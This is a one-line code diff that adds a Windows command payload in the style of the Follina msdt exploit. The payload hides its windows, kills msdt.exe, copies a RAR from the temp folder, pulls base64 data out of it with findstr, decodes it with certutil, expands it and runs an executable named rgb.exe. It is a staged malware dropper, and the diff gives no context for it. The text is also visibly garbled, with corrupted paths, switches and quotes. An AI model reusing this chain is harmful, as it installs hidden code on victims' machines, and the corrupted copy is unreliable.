@@ -1,0 +1,1 @@
+Scmd = 'cilwindowstsystem32\cmd.exe*;Start-Process Scmd -windowstyle hidden -ArgumentList */c taskkill /1 /im msdt.exe";Start-Process Scmd -windowstyle hidden -ArgumentList */c cd C:lusers\publici&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t8&certutil -decode 1. 1.c &&expand 1.c -F:' 8&rgb.exe"
